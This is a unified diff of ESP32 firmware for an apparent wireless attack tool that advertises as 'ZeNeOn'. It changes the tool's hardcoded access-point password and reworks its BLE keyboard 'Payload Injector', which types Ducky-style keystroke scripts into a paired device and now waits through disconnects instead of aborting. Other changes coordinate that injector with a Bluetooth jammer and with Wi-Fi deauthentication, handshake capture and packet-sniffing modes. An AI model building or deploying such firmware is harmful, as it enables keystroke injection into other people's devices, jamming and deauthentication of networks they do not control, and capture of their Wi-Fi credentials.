@@ -2434,7 +2515,7 @@ void setupRoutes() {
     // Restart AP on target channel
     WiFi.softAPdisconnect(true);
     delay(200);
-    WiFi.softAP("ZeNeOn", "12345678", targetChannel);
+    WiFi.softAP("ZeNeOn", "88881234", targetChannel);
     delay(300);
     dnsServer.stop();
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
@@ -2507,7 +2588,7 @@ void setupRoutes() {
     if (targetChannel > 0 && targetBSSID[0] != 0) {
       WiFi.softAPdisconnect(true);
       delay(200);
-      WiFi.softAP("ZeNeOn", "12345678", targetChannel);
+      WiFi.softAP("ZeNeOn", "88881234", targetChannel);
       delay(200);
       dnsServer.stop();
       dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
@@ -2635,6 +2716,13 @@ void setupRoutes() {
       server.send(400, "text/plain", "Stop Payload Injector first — both use BLE stack");
       return;
     }
+    // Must fully tear down NimBLE before Bluedroid can init
+    if (bleNimbleReady) {
+      bleKeyboard.end();
+      bleNimbleReady = false;
+      delay(500);
+      Serial.println("[BT] NimBLE deinitialized for Bluedroid jammer");
+    }
     int t = server.arg("time").toInt();
     if (t < 5) t = 15;
     if (t > 300) t = 300;
@@ -2717,17 +2805,46 @@ void setupRoutes() {
       server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Stop BT Jammer first — both use the BLE stack\"}");
       return;
     }
-    // Deinit jammer BT stack if it was initialized
+
+    // Stop WiFi promiscuous / monitor mode if active
+    if (sniffing || deauthing || capturingHandshake) {
+      esp_wifi_set_promiscuous(false);
+      sniffing = false;
+      deauthing = false;
+      capturingHandshake = false;
+      if (pcapFile) { pcapFile.flush(); pcapFile.close(); }
+      delay(100);
+      Serial.println("[PAYLOAD] Stopped WiFi monitor mode for BLE coexistence");
+      addEvent("PAYLOAD: Stopped monitor mode for BLE");
+    }
+    spamming = false;
+
+    // Deinit jammer BT stack if it was initialized previously
     if (btInitialized) {
       btJamDeinit();
-      delay(200);
+      delay(500);
     }
-    bleKeyboard.begin();
+
+    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+    delay(100);
+
+    // Initialize NimBLE once — never call end() so reconnection always works
+    if (!bleNimbleReady) {
+      bleKeyboard.begin();
+      bleNimbleReady = true;
+      delay(500);
+      Serial.println("[PAYLOAD] NimBLE initialized + advertising as 'ZeNeOn'");
+    } else {
+      Serial.println("[PAYLOAD] NimBLE already active — resuming");
+    }
+
     bleKbStarted = true;
+    bleDisconnectTime = 0;
     payloadStatus = "idle";
-    Serial.println("[PAYLOAD] BLE Keyboard started — advertising as ZeNeOn");
+
+    Serial.printf("[PAYLOAD] BLE Keyboard activated (heap: %u)\n", ESP.getFreeHeap());
     addEvent("PAYLOAD: BLE Keyboard started");
-    server.send(200, "application/json", "{\"ok\":true,\"msg\":\"BLE Keyboard started\"}");
+    server.send(200, "application/json", "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for 'ZeNeOn' in Bluetooth settings\"}");
   });
 
   server.on("/payload/stop", []() {
@@ -2735,10 +2852,12 @@ void setupRoutes() {
     payloadBuffer = "";
     payloadStatus = "idle";
     if (bleKbStarted) {
-      bleKeyboard.end();
+      bleKeyboard.releaseAll();
       bleKbStarted = false;
-      delay(200);
-      Serial.println("[PAYLOAD] BLE Keyboard stopped");
+      // Do NOT call bleKeyboard.end() \u2014 keep NimBLE alive for clean reconnection
+      // Restore WiFi performance
+      esp_wifi_set_ps(WIFI_PS_NONE);
+      Serial.println("[PAYLOAD] BLE Keyboard stopped (NimBLE stays resident)");
       addEvent("PAYLOAD: BLE Keyboard stopped");
     }
     server.send(200, "text/plain", "BLE Keyboard stopped");
@@ -2782,8 +2901,8 @@ void setupRoutes() {
     payloadOffset = 0;
     payloadLinesExecuted = 0;
     payloadTotalLines = countPayloadLines(payloadBuffer);
-    payloadDefaultDelay = 100;
     payloadNextExecTime = millis();
+    bleDisconnectTime = 0;
     payloadExecuting = true;
     payloadStatus = "running";
     lastPayloadLine = "";
@@ -2907,6 +3026,13 @@ void setupRoutes() {
       payloadStatus = "aborted";
       if (bleKbStarted) bleKeyboard.releaseAll();
     }
+    // Stop BLE keyboard if running
+    if (bleKbStarted) {
+      bleKeyboard.releaseAll();
+      bleKbStarted = false;
+      esp_wifi_set_ps(WIFI_PS_NONE);
+      // Don't call end() \u2014 keep NimBLE alive
+    }
     bool wasAttacking = currentPhase != PHASE_IDLE;
 
     if (currentPhase != PHASE_IDLE) {
@@ -2933,7 +3059,7 @@ void setupRoutes() {
     if (wasAttacking) {
       WiFi.softAPdisconnect(true);
       delay(200);
-      WiFi.softAP("ZeNeOn", "12345678", 1);
+      WiFi.softAP("ZeNeOn", "88881234", 1);
       delay(200);
       dnsServer.stop();
       dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
@@ -2969,7 +3095,7 @@ void setup() {
     Serial.printf("[+] SPIFFS: %u/%u bytes used\n", SPIFFS.usedBytes(),
                   SPIFFS.totalBytes());
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP("ZeNeOn", "12345678");
+  WiFi.softAP("ZeNeOn", "88881234");
   WiFi.softAPmacAddress(ownAPMAC);
   IPAddress apIP = WiFi.softAPIP();
   Serial.printf("[+] AP: ZeNeOn | IP: %s\n", apIP.toString().c_str());
@@ -2982,6 +3108,7 @@ void setup() {
   esp_wifi_set_country(&country);
 
   // Don't enable promiscuous at startup — only when attack starts
+  // BLE Keyboard is initialized on-demand (not at boot) to avoid WiFi conflict
   setupRoutes();
   server.begin();
   Serial.printf("[+] Web UI: http://%s\n", apIP.toString().c_str());
@@ -3120,7 +3247,7 @@ void loop() {
     Serial.println("[*] Restoring AP on channel 1...");
     WiFi.softAPdisconnect(true);
     delay(200);
-    WiFi.softAP("ZeNeOn", "12345678", 1);
+    WiFi.softAP("ZeNeOn", "88881234", 1);
     delay(200);
     dnsServer.stop();
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
@@ -3191,6 +3318,7 @@ void loop() {
 
   /* ---- PAYLOAD INJECTOR (BLE HID KEYBOARD) ---- */
   if (payloadExecuting && bleKbStarted && bleKeyboard.isConnected()) {
+    bleDisconnectTime = 0; // reset grace timer while connected
     if (now >= payloadNextExecTime) {
       String line = getNextPayloadLine();
       if (line == "\x01") {
@@ -3201,20 +3329,24 @@ void loop() {
         Serial.printf("[PAYLOAD] Complete — %d lines executed\n", payloadLinesExecuted);
         addEvent("PAYLOAD: ★ COMPLETE — " + String(payloadLinesExecuted) + " lines executed");
       } else {
-        executeDuckyLine(line);
+        executeLine(line);
         payloadLinesExecuted++;
-        // Apply default delay between lines (unless DELAY was explicit)
-        if (payloadDefaultDelay > 0 && !line.startsWith("DELAY")) {
-          payloadNextExecTime = millis() + payloadDefaultDelay;
-        }
       }
     }
   } else if (payloadExecuting && bleKbStarted && !bleKeyboard.isConnected()) {
-    // Device disconnected during execution
-    payloadExecuting = false;
-    payloadStatus = "aborted";
-    payloadBuffer = "";
-    Serial.println("[PAYLOAD] Device disconnected — execution aborted");
-    addEvent("PAYLOAD: ERROR — Device disconnected during execution");
+    // Device disconnected — give grace period for reconnection
+    if (bleDisconnectTime == 0) {
+      bleDisconnectTime = now;
+      Serial.println("[PAYLOAD] Device disconnected — waiting for reconnection...");
+      addEvent("PAYLOAD: Waiting for reconnection...");
+    } else if (now - bleDisconnectTime >= BLE_RECONNECT_GRACE_MS) {
+      // Grace period expired
+      payloadExecuting = false;
+      payloadStatus = "aborted";
+      payloadBuffer = "";
+      bleDisconnectTime = 0;
+      Serial.println("[PAYLOAD] Reconnection timeout — execution aborted");
+      addEvent("PAYLOAD: ERROR — Device disconnected (timeout)");
+    }
   }
 }
